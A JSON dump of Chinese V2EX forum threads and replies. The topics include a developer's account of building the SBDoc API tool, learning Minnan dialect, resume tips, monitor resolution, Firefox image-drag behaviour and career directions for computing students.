{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>此时此刻，坐在电脑前，视线已有些模糊，一天的疲惫从身体内鱼贯而出，三个月的时间，每天就像打鸡血了一样，别人的项目都说自己就差一个程序员了，有时候想想也挺羡慕的，也许真的是万事俱备只欠东风，好吧，其实我没有运营，没有产品，也没有美工，我只有我自己一个人，但是我是一名程序员！</p>\n<p>2013 年末的时候，我从上海回到了老家合肥，从一个谈梦想，拼实干的互联网一线城市回到一个官本位思想的二线城市，说实话，一时有些适应不过来，虽然日子舒服了不少，但是我发现在这样的一个城市里技术很难得到应有的尊重，身边的人都说做程序员有什么前途，公务员可是要好上 100 倍的，大家谈论最多的不是吃点苦踏实干，而是如何走关系，如何拼背景，如何过的更舒服更稳定。记得上学的那会考试没考好老师骂了我几句我就能哭的稀里哗啦，现在项目延期了领导朝我发火我能泰然自若的让领导先把气消消，我不知道是自己长大了还是越来越随波逐流了，内心深处能让我触动的事情越来越少了，现在能让我心里有所波澜的就是每个月收到发工资短信时我朝手机屏幕的那“惊鸿一瞥”吧。</p>\n<p>我自认从小就不是一个走运的人，任何靠运气成分的事情在我身上都不会发生，所以我这一路走来无论在生活上，事业上还是感情上都经历了不少坎坷，但是我也变得越来越坚强，越来越自信，越来越清楚自己努力的方向。 2015 年末的时候，我的工作遇到了一次大的波动，我所在的公司倒闭了，欠我两个月的薪水发不出来了，那时候真的是百感交集，一筹莫展，身边充满了各种嘲讽打击：“让你去 XXX 你不去，安安稳稳的，非要来这种破公司，跟后面创什么业，我跟你说，创业的这帮人都是在社会上混不下去的垃圾专门来忽悠你们这帮傻子的！”我翻了翻微信里同学的朋友圈，不是出国游的就是各种美食度假，仿佛全世界就只有我一个 loser ，每天回家特别怕和媳妇对视，她眼里那期待的眼神，让我心里面特别不是滋味。</p>\n<p>但是，路总得走下去，我这个人越是 tm 的不顺越是能激发我的斗志和潜力，我花了一个月的时间抗住各种压力，祭出毕生功力写了两个小游戏“码农幻想”和“ sky fighting ”，如今还能在 app store 上搜索到，这两个游戏上线很快有了将近 1 万的用户，也帮我在当地的技术圈子聚集了一点小名气，于是有公司主动找到了我！</p>\n<p>去年年末，公司裁员，很庆幸我不用走，但是不幸的是我要决定哪些人是去是留，我这个人有的时候是比较优柔寡断的，尤其不擅长做这种会损害到别人利益的决定，我找了那些还未成家的同事，让他们走了，也给他们推荐了下家，因为我是过来人，我很清楚那种在家人面前无颜以对的感受，我不想因为我的一个决定而伤害到一个家庭。通过这件事情我也清楚的认识到了很多，为此还特地写过一篇文章“程序员那些事之卸磨杀驴”。但是话说回来，我在合肥，我是一名程序员，我热爱编程，我既然选择了这条道路，不管别人怎么评价我，我都不可以妄自菲薄，就算是跪着我也会走下去！</p>\n<p>怎么走？其实我一直有一个想法，做产品不一定要大而全，更应该小而美，如何真正的抓住用户的一个需求，并把它做到极致，我觉得这样的产品就是成功的，我非常钦佩日本的匠人精神，他们做一个寿司就可以做整整一辈子，并且是快乐的做一辈子。我也期望我可以做一个为用户创造价值，也让自己快乐，并且“简单”的产品。在做了很多市场调研和需求分析后，我结合自己平时开发的痛点决定做一款接口管理平台！</p>\n<p>为什么做这个？自己写过前端也写过后端，很明白接口开发对于一个以互联网产品为主团队的重要性，尤其在一个快速迭代的敏捷型初创团队里，如何让前后端并行开发，如何最高效率的编写管理文档，如何测试接口数据并进行智能化识别等，这些都是关乎到一个产品的稳定上线乃至生死存亡的重大问题。于是我很快就选定了后端： nodejs+mongodb+nginx+redis ，前端 webpack+jquery+bootstrap 的技术框架，花了两个月的时间上线了第一个版本，做了初步推广后，很多人吐槽界面太丑，交互太差，有感于做了将近一年的技术管理还是让自己的眼光开阔了不少，于是我立马进行了重构，将前端技术框架换成了 webpack+vue+element ，又花了将近一个月的时间，终于第二版于 3 月初上线了，并且针对很多公司对于接口的敏感性推出了开源的内网版本，功能和线上版本一样，但是可以快速的内网部署。并且，我将这个产品命名为： SBDoc ！</p>\n<p>那么这个平台有哪些不一样的地方呢，首先，团队协作不用说了，可以分配不同的权限，很多其他的类似平台需要安装浏览器插件才能进行接口测试，但是 SBDoc 不需要，无论是 http 还是 https ，走的都是自己的 proxy 透明代理，只有在测试内网的情况下，需要下载一个 js 文件，用 node 环境运行即可，这个 js 文件也是一个代理文件。其次， SBDoc 可以根据测试过的接口数据一键生成文档，大大提高了我们的编写文档的效率，而且这个过程智能化程度非常高。那么在接口测试这一块，无论是文件上传还是 raw 数据发送，又或者是接口加密都可以胜任，最有特色的一个功能点是可以在测试的前后注入自定义的 js 代码，同时 SBDoc 内置了很多变量和函数供用户使用，比如说我们要对接口数据进行一个自定义的加密算法，有了注入功能，只需要写两行代码就搞定啦！在测试结果的返回数据上， SBDoc 也做了智能分析，可以判断出你的返回数据和定义的模型数据是否匹配并且指出错误之处。最后， SBDoc 还集成了一个很强大的功能，就是 Mock 数据，这个可以让前端在后端接口没有完成的情况下并行开发，用户所要做的只是把 mock server 的根地址替换你前端项目的根地址， mock 就会在神不知鬼不觉中悄悄进行！</p>\n<p>其实开发这样的一个产品很累，很辛苦，我每天满脑子想的都是怎么优化，怎么优化，怎么再优化，市面上其实已经有了挺多蛮不错的同类产品，但是我想做出自己的特色，无论是 postman 还是 rap ，又或者是更牛逼的 swagger ，我觉得我必须要挑战他们，因为无论我在哪里，我的内心都是“不安分”的，我必须要榨干我青春的每一滴剩余价值，我要向大家证明，就算“逃离”了北上广，我依然是一个每天对生活充满热情，对工作精益求精，对梦想勇于追求，对现实敢于挑战，活出自我，不断前进的程序员！</p>\n<p>说一个笑话，有人说他们运营，产品，美工都有了，就差一个程序员啦！我想说，我就差运营，产品，美工啦，你们都来我这里吧~</p>\n<p>产品地址： <a href=\"http://sbdoc.cn\" rel=\"nofollow\">sbdoc.cn</a>  开源地址： <a href=\"https://github.com/sx1989827/SBDoc\" rel=\"nofollow\">https://github.com/sx1989827/SBDoc</a>\n<img alt=\"SBDoc\" src=\"http://sbdoc.cn/pic/1.png\"></p>\n</div></div>"], "reply": "4", "tittle": "只差一个程序员了？好吧，其实只有我一个程序员", "comment": ["自己顶一个~", "点赞！", "这个名字。。。", "SBDoc 1.1.6 版本发布\r", "1.把接口测试页面移动到了接口编辑页面内作为一个弹出层显示\r", "2.修复了接口列表点击分组不能展开和接口名称过长出现的 bug\r", "3.在接口列表里增加了对勾显示该接口已开发完成\r", "4.去掉了接口测试里 MockServer ，目前点击预览即可实现 Mock 的功能"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>胡建人.. 你们怎么学习闽南语的.. 怎么指教其他人学闽南语的</p>\n</blockquote>\n<p>在胡建好久了.. 很抱歉 感觉学的最好的只有一句</p>\n<blockquote>\n<p>赛你木机*</p>\n</blockquote>\n<p>最近嗯.. 感觉需要点新技能 ,, 虽然..</p>\n<p>那么问题来了. 怎么学闽南语?</p>\n<p>有学各种繁体中文的.. 台湾和香港的..  app</p>\n<p>在 Google play 上没发现有 闽南语的... 只有之类的歌谣类 app..</p>\n<p>学这个<code>应该</code>不会比.. 英语难吧?</p>\n</div></div>"], "reply": "55", "tittle": "为什么没有学习闽南语的 App..", "comment": ["口语的话，可以找老人家唠唠嗑，或者去菜市场跟人砍价。书面的话比较难。知乎上有个台北人你可以关注一下 ", "感觉你学的唯一这句似乎也不对吧……", "怎么学闽南语...因为从小在闽南语环境下长大所以就会了\r", "\r", "好像没有系统的学习闽南语的方法，平时多找人说说吧", "因为很多读音 你靠拼音加汉字也很难表达出来。。。", " +1", "2 楼加一，身为胡建人也听不懂", "没有字可以学，有闽南话考试，因为闽南人自己也会弄错很多读音，日常是够用。", "难啊, 闽南本土好多都不会了, 感觉也没注重保护.", "多去菜市场买菜", "多去老城区走走，菜市场，或者公园 可以带个相机唠唠嗑，还是需要语境的", "主要还是闽南语口音太多，要学就学台语吧\r", "之前买过一本台湾出版的闽南语字典，里面使用韦氏拼音标注读音（装逼用，顺便以后给女票学闽南语用）\r", "还有，最好的方法是多和本地人唠叨", "闽南语.. 分好多种类, 而且没文字什么记录,也没组织, 规范不了.", "闽南语本身就没有很好的规范，你在泉州市区听到的闽南话到其他地方再听一下你会发现有细微的差别，虽然大体上是一样的但是有些地方的腔调比较重听起来感觉很奇怪\r", "\r", " 闽南语就一种吧…不同的是一些地方的腔调比较重", "文白异读 汉字不同的发音怎么学?->https://twitter.com/taigibot", "各个小地方均有不同腔调，就泉州来讲有明显的安溪腔，南安腔，晋江腔。。。泉州腔", "福建方言包含闽东 闽南 闽中 闽北 话", "每个话都有分支  ", "就算是同一分支 即使在同一个县发音也有变体 衍生", "一个村一个音可不是说说而已 XD", "感觉就是被这搞怕了 福建人推广使用普通话热情比四川广东哪些高的多", " 这可能是由宗族斗争引起的。 ", " 不一定 广东也有宗族斗争 但是粤语还是差不多", "先在厦漳泉三个地方的口音中挑一个学吧。\r", "福建地形多丘陵，自古交通闭塞，不同地方的人沟通很少，造成了方言多口音多的情况。", "现在地道的闽南语在东南亚，闽南的年轻人很多地道的说法已经不懂了。 ", " ", "百度闽南语吧", "唱台语歌", " 作为福建土著，外加厦漳泉生活超过七年的人，还是善意建议你说话最好有把握再说。", " 这是福建被黑得最惨的一次", "是\"塞林木\".楼主别的不学, 就学会了一句粗话, 还说错了....", "并不是所有福建人都讲闽南语，也并不是福建所有沿海都是闽南语，福建的方言太多了，你到时候换个地方就白学了，还是听不懂", "闽南语不同地方口音差别挺大的，光是一个县的南北部就有很多差别", "我只会一句\r", "\r", "jia1 sai4\r", "\r", ":-0", "福建话？\r", "我知道的有六种不同的方言 并且互相听不懂对方的方言 \r", "闽南语也有好几种，但可以听得大概", "我也只会一句\r", "\r", "Let's \"gia\"", "看到不少人說樓主發音錯了，\r", "於是充滿正義感的站出來支持樓主，發音沒錯，塞林木機*  是 塞林木 的升級版，感情更強烈。我們教外地朋友一般就那三個字，五個字的比較難，但你還是學會了！贊贊贊。\r", "\r", "最早開墾台灣的是閩南漳州人顔思齊，在明朝帶領大量閩南漢人遷居台灣。台語主要分漳泉口音，地域上以漳州腔為主，雖然兩者略微有差，但互相都能聽懂。", "A 分支多所以要选一个分支先练熟\r", "B 不如看布袋戏 XDDDD\r", "C 台湾有官方闽南语课本,我妈是教这个的,\r", "D 我知道有闽南语用的输入法,但教学 APP 我就不清楚了", " 闽南语达人，我以为那个*是多打的 = =", "不建议学闽南语，因为实在是不好学，比如口音问题，厦漳泉口音不同，就算是同一个市，泉州德化和晋江口音都差很多，厦门同安和岛内又是不同，你让漳州长泰和东山的对话试试…闽南地区最北的德化和最南的诏安东山说的话，估计对方听不懂。单单就“说”，泉州口音和你“ sei ”，厦漳口音和你“ gong ”。再者，闽南语也存在文白异读，导致“厦门大学”（发音类似 ei men dua oh ）和“厦大”（发音类似 ha dai ）是不一样的😏。\r", "\r", "回到主题，我觉得楼主并没说错啊。\r", "楼主：动词 + 作定语的名词 + 自我和谐过的名词 \r", "二楼，二十五楼：动词 + 名词\r", "上网搜“吴宗宪 八月秋高山林凉”应该可以了解一点……\r", "对应到普通话就是“ CNMB ”和“ CNM ”的区别，福州话也有类似用法“ SNN ”，真的是国骂不分方言😂\r", "\r", "最后，如果楼主的确想在闽南发展，就专门学当地口音吧。（其实我想说不如来学虎 fu 纠 zhou 瓦 hua😋）\r", "\r", "---\r", "\r", "  现在有些司机，动不动就爱加塞，你说是吧😏", "233 为什么要打击楼主呢，无论去其他地方听不听得懂，难不难学，能讲一门小众的语言挺好的。厦漳泉或者不同县口音有差别也没太大关系，和熟悉的人说起来就很有趣啊。", "建议楼主立足环境，同学同事小卖部大妈卖菜老奶奶向他们请教某某怎么说，如果是朝夕相处的人就更好了。另外闽南语电视频道（例如泉州 4 套）或者网上的闽南语歌都还算资源丰富。但是学习非母语的确挺困难的，周期可能很长，楼主加油😀", "在福建待 3 年，精通各种骂人话，莆田系，福州话，闽南话，除了骂人的，其他都听不懂", "表示出了城往乡下一走那口音都不太一样，学个卵子。", "厦门待了四年 学会了各种骂人的话..", "闽南语没有文字，而且一村一口音，没在这种环境里待过学了也听不懂。", " 深入贯彻学语言就要从脏话开始的正确方针！", " 閩南語不僅有文字(正字)，還有音標。參考學習：\r", "\r", "台灣教育部閩南語推薦用字 ", "\r", "豆瓣閩南語正字促進會 ", "\r", "Wikipedia", "来来来，我大闽南语群： MTQ3ODQ1NjI=\r", "内有泉、厦、漳、台及潮汕、温州苍南等不同地区的不同口音（还有哪些地区请原谅我忘记了。。）", " 我不会说我们几个闽南人之间都是用普通话交流 🙄 有的不同镇的就差异明显 更何况大闽南", " 你是广东人吗？", " sei 是说 gong 是讲\r", "说到底还是讲话习惯的问题", "还是蛮难分辨的", "LZ 不觉得潮汕话 很复杂的么", " ...现在干嘛都要搞个 Base64 加密 ,", " #48 我这是入乡随俗 ", " ", "闽南小面语种太多不好学", " 那是台语，闽南语的变种。", " 還是請先 wiki 吧", "天天看 YouTube ，只学会了靠北靠腰甲赛之类的粗口。", "身为闽南人，没听过这句", " 你这算是在黑维基？"]},
{"content": ["<div class=\"topic_content\">简历就是一张脸，敲门砖。\r<br>\r<br>就像做产品，你得了解 C 端（ recruiter ）当然也可以说成是 B ，所以在设计 /排版方面需要有一定思想，至少你需要让她看完并且能 get 到你的亮点或内涵。\r<br>\r<br>我们写简历不是要去应付 recruiter ，但是这关都过不了，你得不到机会来自我展现啊\r<br>\r<br>技术栈 /工作经历 /自我评价 不要污七八糟的什么都写，好吗？ office/ss 科学上网 /markdown ？我说我能顺利滴把 mac 开机 不用鼠标就能 bling bling 的 会 alfred 会 moom 是不是也碉堡了？\r<br>\r<br>recruiter 在筛选评估简历的时候，很核心的几点是 候选人的服从性、工作经历 /所投岗位的匹配性、入职后的稳定性。\r<br>因此 反过来想，尽量不要海投，要找对口的 高度匹配的，你要明白什么叫命中率和时间成本！\r<br>\r<br>而且 recruiter 一天看上百封简历 真心看到吐有木有？所以 一个整洁 /简洁、有设计感 有思想的一份简历 必定让她眼前一亮从而加分。\r<br>\r<br>如果简历中要放照片，丑不丑没关系，重要的是看气质。而且，美图你不会啊？别乍一看跟流氓一样，好吗？\r<br>\r<br>联系方式都是 BASE64 加密 这都什么鬼？\r<br>\r<br>如果一个简历都写不明白，我很难想象工作能力会怎样！\r<br>\r<br>我们不说大环境，就说互联网公司现在的生存状态， 2016 年大多数 VC 资本机构年度预算很少，所以投的项目也异常谨慎，说他们放了一年假都不为过。帝都去年很多初创公司都要去外省找钱，条件也非常苛刻甚至对赌协议，不达到一定的数据指标 想拿个 200 万天使轮或另外一半钱你想都甭想。各互联网公司也在缩紧财政，贝贝网上周也大批量裁员。 2017 这个金三银四 看机会的人太多，导致公司在评估和筛选的标准也节节高升。培训班出来的一批又一批的“人才”叫价也开始趋于理性！猎头公司都死了一批又一批。\r<br>\r<br>最后，不要用拉勾！各种秒拒 参考 star 法则有木有？自我怀疑是个假程序员有木有？</div>"], "reply": "1", "tittle": "看到很多 V 友/程序员 海投简历都没面试邀请！鄙人拙见", "comment": ["哈哈哈哈我觉得拉勾至少让你知道你被拒绝了吖，而不是石沉大海"]},
{"content": ["<div class=\"topic_content\">用了十多年的电脑，到现在才知道眼睛离屏幕远的重要性，现在不能离近看，看一会眼睛就疲劳了，想换个大显示器，还用 1366 的分辨率，这样字体就能大一些，眼睛自然就能远离屏幕了。不知道 27 或者 32 的显示器支持 1366 的分辨率吗？或者有别的显示器推荐吗？其实我现在更想用投影仪来替代显示器。。。</div>"], "reply": "24", "tittle": "27/32 寸的显示器支持 1366*768 的分辨率吗？", "comment": ["调系统 DPI,软件里面用大字体，给自己配眼镜，\r", "调分辨率好像没啥用", "27/32 寸显示器的标准分辨率一般都是 1080P 、 2K 和 4K ，当然你用 1366X768 也不是不可以，画面失真什么的先不说，就那个可视面积你受得了？一个 QQ 窗口就把屏幕占满了……", "相信我，低分辨率才伤眼", "25 寸设置 1600*900 hidpi 非常舒服", "我的建议是,使用 macOS 或者 windows 8 / 10 的系统 , 然后调整缩放 , 这样显示效果比较好. \r", "我现在就是用的 32 寸的 2K 显示器 , dpi 不高 , 设置低分辨率简直惨不忍睹 , macOS 和 windows 我都试过 , macOS 的 hidpi 在我这个显示器上显示效果非常差 , 完全不如 windows10 的缩放效果.\r", "显示器亮度也要低一些 , 不过离的远一些 , 光强自然也会衰弱一些.", "调 DPI 都比调低分辨率要强\r", "\r", "虽然我用的不是大屏，但是默认最大的 1366x768 真的不够用，我用的 FL Studio 一些插件的界面都塞不下。", "不要降低分辨率，而是要提高 dpi 百分比", "10 多年的电脑使用经验。。。还不知道可以设置 dpi 缩放吗。。。\r", "分辨率越低眼睛越容易疲劳， 27 寸尽量 4K 以上的分辨率，设置 300% 的 dpi 缩放（如果可以更高那是最好的）\r", "对于字体来说， Windows 可以试试 MacType ，如果觉得效果不佳，买 iMac 5K 吧\r", "\r", "另外投影仪的方案更差，对于中低端投影仪来说，一是对比度和色准都很差，有的还会抖动，看久了眼睛特别容易累。二是分辨率最高 1080P ，字都是糊的，后果同上。", "低分伤眼啊，何必呢。", "1366×768 就是个奇葩，微软自己全家桶里面的 office 开了 Ribbon 菜单栏，正文就只能显示一半了，不知道是微软脑子让驴踢了还是硬件厂商脑子秀逗了，都没人真正用过么？ Ribbon 真是个糟糕透顶的设计。", "32 村电视基本都是 1366 x768 的,可以考虑松下 32 寸电视", " \r", "\r", "ribbon 是一个已经用了十年的经典设计。\r", "\r", "问题是出在 1366*768 的长宽比上，这意味着 2732*1536 的屏幕（使用 200%的 DPI 比例）也会出现相同的问题。", "刚看了下普通的松下 32 寸电视 1400 左右", "先改用眼习惯，否则再好的设备帮助也不大。", " Ribbon 从开始出来就有问题，从 HMI 的角度讲有很大的设计缺陷。以后有机会我会专门长文讲述的。微软的设计总体策略方面出了问题，微软的总体方向就是整合，不仅是移动平台和桌面平台强调整合，还有专业用户和入门用户整合，过于强调整合而忽视了差异。从 Ribbon Style 开始，到 Metro 以及传说中的下一代 Neon ，都来源于设计哲学上出现了偏差，导致了下游的设计理念、整体策略，设计风格出现了问题。最终就是 windows 的 UI 一代不如一代。", " 从 DOS 到 Win 3.x 是飞跃，从 Win 3.x 到 Win 95 是飞跃，从 Win 9x 到 xp 也算是飞跃（界面变化不大，但内核有了质变），在 Vista 上，微软的 UI 在视觉上登峰造极（只是视觉上），此后是一路下坡。\r", "\r", "其实人机交互最简单的判定标准是，你的系统是不是越来越好用了，用户在使用你的系统时，新的界面是否会让用户更吃力，产生更多的 overhead 。很明显，从 xp 开始，这一条是越来越差。", " 电视这个分辨率也是迷，想买个 1080P 都买不到", "我笔记本外接 27 寸 1080p 开 125%  还可以 就是大果粒有点受不了", "27 寸 4k ， 200%缩放美滋滋。", "我家里有 32 寸 768P ，被我作为电视，如果做 PC 显示器的话会瞎眼的。\r", "现在 PC 用 27 寸 2K 屏，爽歪歪", " 27 寸用 4K 分辨率？！请问您是宇智波一族吗？显卡压力很大吧？", " 200%的缩放，大小等效于 27 寸 1080p ，你想一下手机屏幕就能理解了。", "还在用 1600x1200 的方屏……", "您可以考虑买个电视机，超级低配那种。"]},
{"content": ["<div class=\"topic_content\">linkedin 最近一直无法打开， ping time out.</div>"], "reply": "2", "tittle": "linkedin 挂了……", "comment": ["北方联通正常！你还网打开试试", " 电信可以"]},
{"content": ["<div class=\"topic_content\">项目开发中，有拖拽图片的事件，发现在火狐浏览器上，拖拽图片后松开鼠标会实现图片自动下载，用 js 有什么办法能禁止掉该功能，但也不能把拖拽事件禁止（不是在火狐里面禁止，直接用 js 帮用户禁止掉），新手求各位大神指点</div>"], "reply": "14", "tittle": "如何用 js 实现禁止图片下载", "comment": ["pointer-events: none", "把图片设置为 background", "用 canvas 也行", "做成单贞 vodeo 呢？", "既然要放网上，就别去费时间防这防那的", " #5 你可能没看懂楼主的需求，拖动图片时，浏览器会默认弹出下载框，楼主想要阻止弹出这个下载框", "Firefox51 ，同问这个问题的火狐禁止方法", " 这也是前端的问题，不是火狐的锅， z-index 把图片放下面一层就行了，需要相应的层放图片上面", "设置成 background-image 或者做一个透明 div 层级覆盖 img", "背景图得了，或者 canvas", "直接审查元素下载", "又一个描述不清的帖子。楼主的意思是，项目中要用到图片拖拽事件，但 Firefox 对于拖拽事件的默认行为是下载，所以冲突了。楼主想禁掉 Firefox 的下载行为，自定义处理拖拽事件，而不是为了真的防止用户盗图", "用 Drag API 应该就行了吧，取消掉默认行为。", "不要让鼠标能直接拖动图片，而应该让鼠标拖动图片上层的 div ，然后 js 接管你需要的拖动事务。"]},
{"content": ["<div class=\"topic_content\">主要是能根据产线配置不同的流程，每个流程输入输出的物料也需要灵活配置。</div>"], "reply": "1", "tittle": "请教下生产流程管理有没有合适的设计模式？", "comment": ["做过类似的，可以参考的有工厂模式，状态模式，职责链模式"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.baidu.com/more/\" rel=\"nofollow\">https://www.baidu.com/more/</a>\n页面下的百度 MALL 和百度 iwan 挂了</p>\n</div></div>"], "reply": "5", "tittle": "百度 MALL 和百度 iwan 挂了", "comment": ["这个百度 MALL 是以前的有啊的改版？", " 很早前就有了的，想看看百度 vip 和 mall 有啥区别，结果发现直接挂了...然后顺手看看别的，结果百度 iwan 也挂了= =", " ", " 谢谢。但是也不知道具体哪个部门负责。不过已经内部反馈了"]},
{"content": "", "reply": "10", "tittle": "Xamarin 有用过的吗？搭配 Mvvmcross 感觉走的越远坑越多", "comment": ["研究跨平台已久，现在最有前途的是 react native 。", "我们一直用 Xamarin ，感觉挺好的，挺强大。如果用 Xamarin ，移动要用 Xamarin.Forms + Caliburn.Micro + Autofac 才是正路", "也有用过一段时间，后来干脆直接 angular2 + native script 了", "Xamarin 大坑", "Xamarin 本质上是解决同一款产品，团队 Android 和 iOS 需要各自实现逻辑层的代码的问题。使用这种技术的前提是团队本身对 iOS 和 Android 的开发很了解，如果你精通 iOS 和 Android ， Xamarin 可以作为一个选择，用 C# 做逻辑层， UI 用各自平台的 API 就好。\r", "\r", "但首先需要对产品需要用到的关键技术做实验，看 Xamarin 开发有没有什么框架层面的坑。\r", "\r", "最后，不建议在公司使用 Xamarin ，外包除外。", " 这几天疯传苹果有封杀的可能 怎么看？", " Xamarin.Forms 对于 android 来说有点卡顿 而且 ios 的向右横向滑动返回上一个界面这样的小细节也会丢失", " 想问一下 有没有可能 xamarin 里面嵌入一些用 ionic 的页面", " ", " 用 webview 就行了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>因为工作原因在家也要长时间坐着，请问有什么适合的座椅坐着舒服哒？</p>\n</div></div>"], "reply": "13", "tittle": "有没有适合的人体工程学座椅推荐啊？", "comment": ["每半个小时活动一下胜过任何椅子…", "米勒那款 1W+的。锤子好像就是这个。不过支持楼上的兄弟说的。", " 锤子只有设计师给配了那个椅子，程序员坐不上的", "游戏椅子你看看？直播里的丑开那款", " 不好的椅子怕是连半小时都坐不到啊~~", "龙骨椅.", "越不舒服的椅子越好，因为屁股告诉你，要起来走走了。", "\r", "\r", "我买了两个这个，大佬们都说是入门级的。但是我觉得超舒服", "千把块钱就可以了。楼主自己心里对合适的椅子要有标准。", "我用的 embody", "我用的 Steelcase leap", " 这个天猫上看了下 要 10000 左右啊 略贵。。。", "你们久坐了是屁股疼吗？我是肩膀疼，屁股还好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>&lt;div id=\"example-3\"&gt;\n  &lt;button v-on:click=\"say('hi')\"&gt;Say hi&lt;/button&gt;\n  &lt;button v-on:click=\"say('what')\"&gt;Say what&lt;/button&gt;\n&lt;/div&gt;\n</code></pre>\n<p>想看 vue 的源码，奈何一时下不了手</p>\n</div></div>", "<div class=\"topic_content\">大概猜到了，用 Function 构造器实现的</div>"], "reply": "目前尚无回", "tittle": "求教 vue 的内联处理器方法是怎么实现的？", "comment": []},
{"content": "", "reply": "7", "tittle": "请问 PLM 是做什么的？和 Java 有什么关联？", "comment": ["\r", "帮你搜好了,不谢 ", " ", "没关系， PLM 做制造行业工艺设计的。产品生命周期管理。", " 谢谢", " 请问认识了解 PLM 的 Java 程序猿吗？我这里有个岗位要招聘", "  你可以把 plm 当作 ERP ， ", " 。一般用 Java 开发。", " 你那里做什么的，这个一般在工业企业，我是做类似方面的。", " 我现在在招聘这样的岗位，制造业的"]},
{"content": ["<div class=\"topic_content\">LZ 大一，对 Web 前端后端这些好像不是很感冒。当然要学还是可以的。\r<br>\r<br>还有， C/C++ 现在应用还多吗？\r<br>\r<br>P. S. 我知道问这个有点早，也知道现在要打好专业基础。只是想了解下行情 :)</div>"], "reply": "56", "tittle": "现在除了 Web 开发，还有什么好找工作的方向吗？", "comment": ["大一多出去耍，不要只想着在计算机上吊死", "目前都是 java 时代了，一般的互联网公司基本都是以 java 为主", "你也可以去问问浙江大学的陈越姥姥", " 可是我对计算机挺感兴趣的啊。。。", " 那除了 Web 还有别的方向吗？还是说行情都不好？？", " 刚刚谷歌了一下，孤陋寡闻了😅", "最好先保证成绩够保研， 408 四件套一定要学好。\r", "广泛接触，多尝试，到大三才能知道自己真正喜欢和适合的方向。", "现在的热门说不定到你毕业时候又饱和冷门了。。。", "C/C++越来越窄，应用层是 java 的天下。", "神经智人方向", "大一到大三随便玩吧。多看看这个世界，多出去走走，你就会发现计算机不是你唯一的出路", " 好的，有读研意向，不过现在研究生一般都是做机器学习方面的了吧？", " 所以说万年不变的才是基础。。。。了解了解动态也无妨嘛", " #12 不一定，研究别的的也有", "大一多出去玩。开阔视野。当然基础学习不能落下。保持成绩在年级的最前面就行了。", " 我也想出去玩，但是这学期高数线代离散大物一起上，应付不过来啊。好吧，可能只是我不会管理时间。", " 人工智能吗？", "去搞 AI 和数据挖掘之类的吧……", "传统 IT 已经是夕阳产业了，现在要做复合型产业\r", "\r", "人工智能，金融工程，大数据，区块链什么的", "人工智能，深度学习，搞算法更有前（钱）途，培训班也培训不来", "学算法，搞 acm ，其他的都可以先不用管。 acm 能拿全国银奖以上", " 为何姥姥躺着中枪，她只是想安安静静做好 pat 而已啊", " 搞机器学习的应用需要比较好的概率论、线性代数和最优化方法（求函数极值）。\r", "\r", "概率论和最优化方法的先修是微积分，所以是重中之重。线性代数的重点在于学会从线性空间角度看矩阵和向量运算，而不是死板的那些东西。\r", "\r", "如果要高机器学习的研究，你可能还需要学数学分析。", "还是比较广的。\r", "\r", "现在较多人做的是 Android/iOS 客户端。\r", "还有一些高精尖的： 人工智能，机器学习，区块链（金融），大数据，智能硬件，云计算等。\r", "想做上面这些得把你的基础知识搞得扎实，编程技巧倒是其次，语言更次之。\r", "\r", "C/C++ 用的方向也是比较多的，你自己可以到招聘网站上看看人家招来干什么，这样你更有感触。\r", "我所知道的， C 在嵌入式方面是不倒翁，操作系统的相关的，单片机等。\r", "\r", "C++的地位渐渐的被 Java 取代了，以前后台用 C++做的还是比较多的，但是某些方面还是 C++更擅长些，如图形编程。\r", "\r", "方向排首位，语言次之。\r", "举例：我三哥是学土木工程的，干了两年多，转行计算机，刚开始用 Python 作为敲门砖，做了图形设计方面的工作，现在换了一家，也是基于本专业，运用计算机作图形建模。", "1. 学好数学（ CS 主要是离散、概率、代数比较重要）和编译原理\r", "2. 楼上指出了，在学好（ 1 ）的前提下在学好 408 四件套\r", "3. 现在才是编程语言，最重要的编程语言—— C 语言，高级语言建议 Java （ C++是一门问题很大的语言），然后涉猎其他更多范式\r", "4. 在语言应用的基础上学习体会计算与软件设计的一些思想\r", "5. 差点忘了还有英语，大二之前要过 6 级\r", "\r", "P.S.\r", "过来人的经验经验之谈，希望你多看点书，少走弯路\r", "`我知道问这个有点早`——我认为一点也不早", "开发诶啪啪啊", "业务方面的确 c++的应用越来越窄了\r", "但是大型互联网公司里的基础组件 c++用的还是非常多的", " \r", " \r", " \r", "十分感谢大佬指点！手动点两个赞\r", "（语言本身并不太重要我是清楚的：）\r", "\r", "我还有一个可能不好回答的问题：数学作为基础要达到什么样的水平才算够呢？比如能理解算法背后的数学原理吗？", " \r", "如果不是做的特别深，数学用途并不大，不过数学好对你以后发现有好处。数学和英语，非常重要。\r", "要不然到我这个情况，又来看数学了，", " 唉，现在人工智能那些都要数学啊。要不然也就只有 Web 和移动端开发了，移动端还可以考虑， Web 不太想做，虽然有重合的地方。", "我们在主推 Go 语言了", "非常同意一楼的说法，大一就多出去玩吧，毕业之后再没有这么好的时光了。", " 大哥，这学期都是重要的数学课，要花时间学的啊，加上自己作死选了门不擅长的选修，哪还有工夫去玩 qaq", "不喜欢 web 可以做 app 客户端啊，哈哈\r", "数据挖掘也挺火的", " 只要保证不挂科就行，有时间就去玩。\r", "\r", "就算挂科，大四也是可以补回来的。只要你知道自己要什么", "大一就开始考虑毕业做什么的学生真的很犀利\r", "给的建议就是看看你理想工作城市的就业情况\r", "多上拉钩这些互联网招聘网站上看看 招聘需求 以及薪资待遇.\r", "不过呢要一直看才行. 因为计划赶不上变化快.\r", "你现在学的东西到毕业可能就用不上了. \r", "既然选择干这行一定要持续关注才可以.", "大一到大三玩的话= =感觉就难找工了", "如果你想以后找到好工作，或者进大公司，或者去国外的，就别听一楼说的出去玩。  抓紧每一分钟学习，学到的都是自己的", " 达到能差不多开始能看懂一本正儿八经的机器学习书籍的程度，然后你去看机器学习，看着看着你就会明白以前学过的数学有啥用，并且发现数学又不够了，然后再继续学数学。\r", "\r", "当然微积分和线性代数是基础中的基础，这个你开始学完了再开始看机器学习的书吧。我推荐两本（我看过的）机器学习书：[Deep Learning]( ", ")  和 [Pattern Recognition and Machine Learning]( ", ")\r", "\r", 